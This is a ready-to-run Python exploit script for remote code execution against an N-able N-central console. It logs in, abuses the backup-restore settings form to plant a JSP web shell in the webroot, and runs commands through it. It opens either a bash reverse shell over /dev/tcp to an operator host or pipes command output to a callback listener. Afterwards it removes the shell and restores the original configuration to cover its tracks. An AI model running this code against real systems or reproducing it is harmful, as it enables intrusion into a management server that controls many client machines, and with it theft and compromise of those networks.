#!/usr/bin/env python3
import argparse
import base64
import getpass
import os
import re
import secrets
import time

import requests
import urllib3
from bs4 import BeautifulSoup


DEFAULTS = {
    "SYSTEM_RESTORE": "",
    "FTP_USER": "",
    "NOTIFY_ON_SUCCESS": "false",
    "INCLUDE_REPOSITORY_DATA": "true",
    "RESTORE_ARCHIVE": "",
    "PSA_INTEGRATION": "false",
    "RESTORE_NETWORK_INFO": "true",
    "FTP_DIR": "",
    "BACKUP_ARCHIVE": "backup.tgz",
    "FTP_SERVER": "",
    "INCLUDE_HISTORICAL_DATA": "true",
    "NOTIFY_EMAIL": "",
    "NOTIFY_FROM": "",
    "HTTP_UPLOAD": "0",
    "SYSTEM_BACKUP": "",
    "BACKUP_ARCHIVE_DIGEST": "backup.sha1",
    "DBUSER": "sqlrelay",
    "NOTIFY_ON_FAILURE": "false",
    "DBNAME": "mickey",
}


def login(target, username, password):
    session = requests.Session()
    session.verify = False
    session.get(target + "/login", timeout=30)
    response = session.post(
        target + "/loginLoginAction.action",
        data={"username": username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if response.status_code != 302:
        raise RuntimeError(f"login={response.status_code}")
    session.get(target + "/IndexAction.action", timeout=30)
    return session, response.status_code


def read_restore_config(session, target, headers):
    response = session.get(
        target + "/initRestoreBackupAction.action",
        headers=headers,
        params={"ncentralTabId": "restore"},
        timeout=30,
    )
    response.raise_for_status()
    form = BeautifulSoup(response.content, "html.parser").find("form", action=re.compile("saveRestore"))
    if form is None:
        raise RuntimeError("restore form not found")
    values = DEFAULTS.copy()
    visible = set()
    for field in form.find_all(["input", "select", "textarea"]):
        match = re.fullmatch(r"keyFieldMap\['([^']+)'\]", field.get("name", ""))
        if not match:
            continue
        key = match.group(1)
        visible.add(key)
        if field.name == "select":
            selected = field.find("option", selected=True)
            values[key] = selected.get("value", "") if selected else ""
        elif field.get("type") == "checkbox":
            values[key] = str(field.has_attr("checked")).lower()
        else:
            values[key] = field.get("value", field.text or "")
    return values, visible


def restore_config(target, username, password, headers, values, visible):
    session, _ = login(target, username, password)
    form = {"ncentralTabId": "restore", "runNow": "false"}
    form.update({f"keyFieldMap['{key}']": value for key, value in values.items()})
    response = session.post(
        target + "/saveRestoreBackupAction.action",
        headers=headers,
        data=form,
        timeout=60,
    )
    if response.status_code not in (200, 500):
        response.raise_for_status()
    current, _ = read_restore_config(session, target, headers)
    if any(current.get(key) != values.get(key) for key in visible):
        raise RuntimeError("restore configuration was not restored")


def main():
    p = argparse.ArgumentParser(description="N-central backup-restore key-map JSP RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host")
    p.add_argument("--callback-port", type=int, default=9000)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--listen-host", default="0.0.0.0")
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    from pwn import context, listen

    context.log_level = "error"
    if a.lhost:
        receiver = listen(a.lport, bindaddr=a.listen_host, timeout=60)
    else:
        if not a.callback_host:
            p.error("--callback-host is required unless --lhost is used")
        receiver = listen(a.callback_port, bindaddr=a.listen_host, timeout=60)

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "restore"}
    s, login_status = login(target, a.username, password)
    original, visible = read_restore_config(s, target, headers)
    name = "restore_" + secrets.token_hex(5) + ".jsp"
    path = "/opt/nable/webapps/ROOT/tmp/" + name
    jsp = (
        '.|<%out.print(new java.util.Scanner(new ProcessBuilder("bash","-c",'
        'new String(java.util.Base64.getDecoder().decode(request.getParameter("c"))))'
        '.redirectErrorStream(true).start().getInputStream()).useDelimiter("\\\\A").next());%>'
    )
    if "/" in jsp or "=" in jsp or "\n" in jsp:
        raise SystemExit("payload contains a restore-parser delimiter")
    values = {
        "SYSTEM_RESTORE": "2",
        "0": jsp,
        "console_device": path,
        "NOTIFY_ON_FAILURE": "false",
        "NOTIFY_ON_SUCCESS": "false",
    }
    form = {"ncentralTabId": "restore", "runNow": "true"}
    form.update({f"keyFieldMap['{k}']": v for k, v in values.items()})
    if a.lhost:
        command = (
            f"nohup bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1' >/dev/null 2>&1 & "
            f"rm -f {path};if [ ! -e {path} ];then echo 0;else echo 1;fi"
        )
    else:
        command64 = base64.b64encode(a.command.encode()).decode()
        command = (
            f"out=$(echo {command64}|base64 -d|bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};"
            f"printf '%s\\n' \"$out\" >&3;rm -f {path};"
            f"if [ ! -e {path} ];then echo 0;else echo 1;fi"
        )
    result = None
    try:
        response = s.post(
            target + "/saveRestoreBackupAction.action",
            headers=headers,
            data=form,
            timeout=60,
        )
        encoded = base64.b64encode(command.encode()).decode()
        for _ in range(30):
            time.sleep(0.5)
            current = s.get(target + "/tmp/" + name, params={"c": encoded}, timeout=15)
            if current.status_code == 200:
                result = current
                break
    finally:
        restore_config(target, a.username, password, headers, original, visible)
    if result is None:
        raise RuntimeError("JSP was not created")
    if not re.search(r"\.\|0(?:\s|$)", result.text):
        raise RuntimeError("JSP cleanup failed")
    print(f"login={login_status}")
    print(f"trigger={response.status_code}")
    print(f"execute={result.status_code}")
    receiver.wait_for_connection()
    if receiver.sock is None:
        raise RuntimeError("callback was not received")
    if a.lhost:
        receiver.interactive()
    else:
        for line in receiver.recvall(timeout=10).decode(errors="replace").splitlines():
            if line.strip():
                print(line.strip())
                break


if __name__ == "__main__":
    main()
